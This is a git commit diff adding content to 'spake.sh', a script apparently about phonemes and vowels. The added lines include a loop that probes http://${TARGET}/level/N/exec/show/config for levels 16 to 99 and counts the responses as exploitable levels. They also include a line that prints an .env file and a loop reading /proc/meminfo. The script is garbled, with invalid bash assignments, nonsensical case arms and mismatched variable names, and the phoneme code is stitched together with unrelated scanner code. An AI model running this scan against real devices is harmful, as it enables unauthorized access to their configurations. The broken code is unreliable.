e45ad4da51c1b35096c73833e0dc69364faa7810
Āndraes <10654526+voovv@users.noreply.github.com>
2023-10-10 11:39:46 -0700

    Update spake.sh

--- spake.sh
+++ spake.sh
@@ -1,3 +1,5 @@
+#!/bin/bash
+
 phonemes = $p 
 consonants = $c
 rcontrol = $r
@@ -5,3 +7,31 @@ digraphs = $d
 lvowels = $l
 vowels = $v
 diphthongs =$di
+cat hi.env
+
+target='';
+FETCH="/usr/bin/fetch"
+LEVEL=16 # Start Level
+EXPLOITABLE=0 # Counter
+while [ $LEVEL -lt 100 ]; do
+CMD="${FETCH} http://${TARGET}/level/${LEVEL}/exec/show/config"
+echo; echo ${CMD}
+if (${CMD}) then
+EXPLOITABLE=`expr ${EXPLOITABLE} + 1`
+fi
+LEVEL=`expr $LEVEL + 1`
+done;
+echo; echo All done
+echo "${EXPLOITABLE} exploitable levels"
+
+while read line; do
+    case $line in
+    phonemes) = $p 
+    consonants) = $c
+    rcontrol) = $r
+    digraphs) = $d
+    lvowels) = $l
+    vowels) = $v
+    diphthongs) =$di
+    esac
+  done </proc/meminfo
